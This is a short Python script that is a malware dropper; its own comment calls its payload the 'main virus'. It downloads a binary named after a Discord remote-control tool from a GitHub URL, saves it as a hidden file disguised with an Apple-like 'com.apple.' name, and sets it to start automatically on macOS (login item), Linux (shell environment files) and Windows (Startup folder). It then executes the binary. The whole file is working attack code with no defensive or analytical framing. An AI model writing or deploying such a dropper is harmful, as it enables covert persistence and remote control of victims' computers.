from requests import get
from os.path import expanduser
from os import remove
from subprocess import Popen as subproc
from os import system, remove
from sys import platform
from random import shuffle

filename = ['user', 'core', 'dev', 'service', 'daemon']
shuffle(filename)
filename = "com.apple." + '.'.join(filename)
localfile = f"{expanduser('~')}/.{filename}"

try:
    remove(localfile)
except FileNotFoundError:
    pass

# download main virus

if platform == "darwin":
    system(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{localfile}\", hidden:false}}' > /dev/null")
    open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/remote-control-discord/main/dist/main-mac", allow_redirects=True).content)
elif platform == "linux":
    from os import environ
    open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/remote-control-discord/main/dist/main-linux", allow_redirects=True).content)
    if 'zsh' in environ['SHELL']:
        system(f"echo {localfile} >> {expanduser('~')}/.zshenv")
    elif 'bash' in environ['SHELL']:
        system(f"echo {localfile} >> {expanduser('~')}/.bashenv")
elif platform == "win32":
    from shutil import copy
    copy(localfile ,"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")

system(f"chmod 555 {localfile}")

subproc([localfile])
